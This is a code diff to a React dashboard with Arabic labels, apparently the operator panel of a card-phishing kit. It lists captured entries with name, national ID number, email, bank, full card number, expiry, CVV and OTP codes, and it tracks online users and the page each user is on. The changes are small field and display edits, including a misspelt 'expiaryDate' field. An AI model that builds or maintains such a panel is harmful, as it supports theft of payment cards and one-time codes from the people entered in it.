@@ -114,7 +114,7 @@ interface Notification {
   ip?: string;
   cvv: string;
   id: string | "0";
-  expiryDate: string;
+  expiaryDate: string;
   notificationCount: number;
   otp: string;
   otp2: string;
@@ -147,6 +147,7 @@ interface Notification {
   phone: string;
   flagColor?: string;
   currentPage?: string;
+  userName?: string;
 }
 
 // Hook for online users count
@@ -1965,7 +1966,7 @@ export default function NotificationsPage() {
             <div className="space-y-4">
               <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                 {[
-                  { label: "الاسم", value: selectedNotification.name },
+                  { label: "الاسم", value: selectedNotification.userName },
                   { label: "رقم الهوية", value: selectedNotification.idNumber },
                   {
                     label: "البريد الإلكتروني",
@@ -1983,7 +1984,7 @@ export default function NotificationsPage() {
                         <span className="font-medium text-muted-foreground">
                           {label}:
                         </span>
-                        <span className="font-semibold">{value}</span>
+                        <span className="font-semibold" dir="ltr">{value}</span>
                       </div>
                     )
                 )}
@@ -1998,14 +1999,14 @@ export default function NotificationsPage() {
                { label: "البنك", value: selectedNotification.bank },
                   {
                     label: "رقم البطاقة",
-                    value: selectedNotification?.cardNumber +" - "+selectedNotification?.prefix ,
+                    value: selectedNotification?.cardNumber ,
                   },
                   {
                     label: "تاريخ الانتهاء",
                     value:
                       selectedNotification.year && selectedNotification.month
                         ? `${selectedNotification.year}/${selectedNotification.month}`
-                        : selectedNotification.expiryDate,
+                        : selectedNotification.expiaryDate,
                   },
                   { label: "رمز الأمان", value: selectedNotification.cvv },
                   { label: "رمز التحقق", value: selectedNotification.otp },
